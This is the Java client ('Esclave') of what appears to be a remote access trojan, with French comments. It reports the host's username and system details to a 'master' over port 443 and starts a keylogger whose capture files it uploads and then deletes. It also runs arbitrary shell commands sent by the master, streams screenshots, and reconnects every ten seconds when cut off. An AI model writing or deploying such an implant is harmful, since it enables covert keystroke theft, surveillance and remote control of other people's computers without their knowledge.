package client;

import java.awt.AWTException;
import java.awt.Robot;
import java.io.BufferedInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.net.InetAddress;
import java.net.Socket;

import remote.action.CMD;
import remote.action.Keylogging;
import remote.action.Notification;
import remote.action.RemoteActions;
import remote.action.ScreenShot;
import send.specific.object.SendImage;
import send.specific.object.SendSpecificObject;
import constante.Constante;

/**
 * 		Gestion et coordination des différentes fonctionnalités de l'esclave
 * 
 * @author lh
 *
 */

public class Esclave {
/**********************************************************************************************************************************************/
/*													   ARGUMENT																	   			   /	
/**********************************************************************************************************************************************/
	
	
	private final static int _portMaitre = 443;									// Port de la machine distante
	private final static String _addresseMaitre = "192.168.56.1";				// Addresse IP de la machine distante
	private static InetAddress _addresse;

	private static ObjectInputStream _in;										// Flux d'entree
	private static ObjectOutputStream _out;										// Flux de sortie

	private Socket _s;
	private Keylogging _klgg;
	private Robot _robot;
	private CMD _cmd = null;
	private static Esclave _esclave;

	
/********************************************************************************************************************************************/
/*													   CONSTRUCTEUR																	   			   /	
/**********************************************************************************************************************************************/
	public Esclave() throws ClassNotFoundException, InterruptedException, IOException, AWTException {

		
			
			connect();
				
			
	}

	
	
	

/********************************************************************************************************************************************/
/*													   METHODES																	   			   /	
/**********************************************************************************************************************************************/

	
	
	
	private boolean connect() throws IOException, AWTException, ClassNotFoundException, InterruptedException 
	{
		try {
			_s = new Socket(InetAddress.getLocalHost(), _portMaitre);
		
		_out = new ObjectOutputStream(_s.getOutputStream());

		_in = new ObjectInputStream(new BufferedInputStream(
				_s.getInputStream()));

		_addresse = _s.getInetAddress();
		
		String fileseparator = System.getProperty("file.separator"), username = System // Initialise
																						// les
																						// proprietes
				.getProperty("user.name"), os_version = System 							// du système
																// esclave
				.getProperty("os.version"), os_name = System
				.getProperty("os.name"), os_arch = System
				.getProperty("os.arch"), user_country = System
				.getProperty("user.country");

		_out.writeObject(_addresse + "++" + fileseparator + "++"
				+ username 																// Envoi les proprietes au Maitre
				+ "++" + os_version + "++" + os_name + "++" + os_arch + "++"
				+ user_country);

		_out.flush();
		} catch (Exception e){
			return false;
		}
		_klgg = new Keylogging(); 				// Appelle le constructeur d'un nouveau
												// keylogger
		_robot = new Robot(); // Instancie un robot
		this.receive(this); // Instancie la reception des donnees
		return true;
		
	}
	/**
	 * Fonction qui prend en charge les flux de données entre le maitre et l'esclave
	 * @param esclave
	 * @throws ClassNotFoundException
	 * @throws IOException
	 * @throws InterruptedException
	 */
	public void receive(final Esclave esclave) throws ClassNotFoundException,
			IOException, InterruptedException {
		Thread recevoir = new Thread("Receive") {
			@Override
			public void run() {
				Object action;

				try {
					while (true) {

						action = _in.readObject();												// Recupere les objets du socket
						if (action instanceof Integer) 											// Gere les differents objets recus
																								// En utilisant des codes
						{
							Integer code = (Integer) action;									
							if (code.equals(Constante.code_keylog)) 							// Code pour recuperer un fichier avec la saisie
							{
								sendfileKeylog();

							}
							else if (code.equals(Constante.code_notif))							// Code pour afficher une notification
							{
								Object string = _in.readObject();
								if(string instanceof String)
								{
									Notification notif = new Notification((String) string);

								}
							}
							else if (code.equals(Constante.code_cmd)) 							// Code pour lancer une commande terminal
							{
								// System.out.println("[debug] Nouveau requete CMD: ");

								if (_cmd == null) 
								{
									_cmd = new CMD();
								}
								action = _in.readObject();
								if (action instanceof String) 										// Recupere l'instruction
								{
									String instruction = (String) action;
									String res = "";
									res =_cmd.nouvellecommande(instruction,
											esclave);
									 System.out.println("[debug]"+res);

									if (!res.equals(Constante.code_message_cmd)) 					// Renvoit l'instruction
									{
										_out.writeObject(Constante.code_cmd);
										_out.flush();
										_out.writeObject(res);
										_out.flush();
									}
								}
							} 
							else 
							{
								//System.out.println("Objet non identifie");
							}
						} 
						else if (action instanceof RemoteActions) 									// Reception d'une requete pour VNC
						{
							RemoteActions remoteaction = (RemoteActions) action;

							if (remoteaction instanceof ScreenShot) 
							{

								ScreenShot screenshot = (ScreenShot) remoteaction;
								Object result = screenshot.executer(_robot);

								if (result != null) 
								{


									byte[] size = (byte[]) screenshot.getsize();
									if (!size.equals(null)) 
									{

										_out.writeObject(Constante.code_vnc);
										_out.flush();
										SendImage.sendImage(_out, size,
												(byte[]) result);
										
									}
								}
							}
							else 
							{
								Object result = remoteaction.executer(_robot);
							}

						}
					}

				} catch (ClassNotFoundException | IOException e) {						// Forger le processus
					
						try {
							while(!connect()){
								try {
									Thread.sleep(10000);								// Fait une pause de 10 sec avant de se reconnecter
								} catch (InterruptedException e1) {
									// TODO Auto-generated catch block
									e1.printStackTrace();
								}
							
}
						} catch (ClassNotFoundException | IOException
								| AWTException | InterruptedException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
							} catch (InterruptedException e) {
					
					e.printStackTrace();
				} catch (AWTException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		};
		recevoir.start();
	}

	

	public static ObjectOutputStream getOut() {
		return _out;
	}

	
	
	
	
	/**
	 * Envoyer le fichier de Keylog au Maitre et relancer un nouveau keylogger
	 * @throws IOException
	 * @throws InterruptedException
	 */
	public void sendfileKeylog() throws IOException, InterruptedException {
		String chemin = _klgg.getCheminFile();
		_klgg.arreteKeylog();
		SendSpecificObject.sendTxt(chemin, _out);
		_klgg.supprimerFichier();
		_klgg = new Keylogging();
	}

	
	
	/**
	 * Main de l'esclave
	 * @param args
	 * @throws ClassNotFoundException
	 * @throws IOException
	 * @throws InterruptedException
	 * @throws AWTException
	 */
	public static void main(String[] args) throws ClassNotFoundException,
			IOException, InterruptedException, AWTException {
		_esclave = new Esclave();
	}
}
